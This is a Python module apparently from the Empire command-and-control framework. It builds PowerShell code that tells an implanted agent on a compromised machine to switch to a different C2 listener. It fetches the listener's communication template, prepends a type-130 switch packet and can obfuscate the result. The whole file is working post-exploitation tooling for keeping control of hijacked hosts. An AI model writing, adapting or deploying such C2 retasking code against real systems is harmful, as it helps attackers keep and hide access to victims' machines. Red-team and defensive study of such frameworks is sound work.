from typing import Dict, Optional, Tuple

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> Tuple[Optional[str], Optional[str]]:
        # extract all of our options
        listener_name = params["Listener"]

        active_listener = main_menu.listenersv2.get_active_listener_by_name(
            listener_name
        )
        if not active_listener:
            return handle_error_message(
                "[!] Listener '%s' doesn't exist!" % (listener_name)
            )

        listener_options = active_listener.options

        script = main_menu.listenertemplatesv2.new_instance(
            active_listener.info["Name"]
        ).generate_comms(listenerOptions=listener_options, language="powershell")

        # signal the existing listener that we're switching listeners, and the new comms code
        script = (
            "Send-Message -Packets $(Encode-Packet -Type 130 -Data '{}');\n{}".format(
                listener_name,
                script,
            )
        )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
